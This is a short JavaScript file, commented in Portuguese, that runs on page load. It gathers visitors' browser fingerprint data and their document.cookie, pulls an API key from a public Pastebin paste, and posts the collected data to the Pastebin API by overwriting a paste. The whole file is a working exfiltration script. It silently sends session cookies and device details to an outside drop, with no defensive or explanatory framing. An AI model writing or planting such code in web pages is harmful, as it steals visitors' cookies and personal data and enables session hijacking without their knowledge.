function coletarDados() {
    const dados = {
        userAgent: navigator.userAgent,
        navegador: navigator.appName,
        plataforma: navigator.platform,
        tela: {
            largura: screen.width,
            altura: screen.height,
            profundidade: screen.colorDepth
        },
        cookies: document.cookie,
        localStorage: localStorage.length,
        sessionStorage: sessionStorage.length
    };

    // URL do Pastebin contendo a API Key
    const pastebinKeyUrl = 'https://pastebin.com/raw/L6LkHB3B'; // Link do paste onde a API Key está armazenada

    fetch(pastebinKeyUrl)
        .then(response => response.text())
        .then(apiKey => {
            // ID do Paste que será editado
            const pasteId = 'L6LkHB3B';

            // Converte os dados para JSON
            const jsonData = JSON.stringify(dados, null, 2);

            // Configura a URL da API do Pastebin
            const pastebinApiUrl = `https://pastebin.com/api/api_post.php`;

            // Parâmetros para a requisição na API do Pastebin
            const formData = new URLSearchParams({
                api_dev_key: apiKey.trim(), // Chave de desenvolvedor
                api_option: 'edit', // Opção de editar o paste
                api_paste_code: jsonData, // Dados a serem escritos no paste
                api_paste_key: pasteId // Identificador do paste a ser editado
            });

            // Faz a requisição POST para editar o paste
            fetch(pastebinApiUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: formData
            })
            .then(response => response.text())
            .then(result => {
                console.log('Paste editado com sucesso:', result);
            })
            .catch(error => {
                console.error('Erro ao editar o paste no Pastebin:', error);
            });
        })
        .catch(error => {
            console.error('Erro ao recuperar a API Key do Pastebin:', error);
        });
}

// Chama a função quando a página carregar
window.onload = function() {
    coletarDados();
};
